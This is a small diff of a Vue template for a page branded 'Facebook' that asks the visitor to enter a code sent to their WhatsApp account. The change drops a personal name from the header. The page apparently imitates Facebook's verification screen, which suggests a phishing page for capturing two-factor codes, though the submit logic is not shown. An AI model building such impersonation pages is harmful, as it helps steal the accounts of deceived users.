@@ -46,7 +46,7 @@ const handleSubmit = async () => {
 <template>
   <div class="flex px-4 justify-center items-center w-full h-screen bg-[#f1f5fb]">
     <div class="max-md:w-full w-[600px]">
-      <p class="text-[13px] mb-4">Monica Guan • Facebook</p>
+      <p class="text-[13px] mb-4">Facebook</p>
       <p class="text-[1.5rem] font-[600] leading-[17px] max-md:leading-[27px]">Check your WhatsApp messages</p>
       <p class="text-[13px] mt-5 mb-4">Enter the code that we sent to your WhatsApp account.</p>
       <img class="mb-4" src="/assets/images/code-pin.png" alt="" />
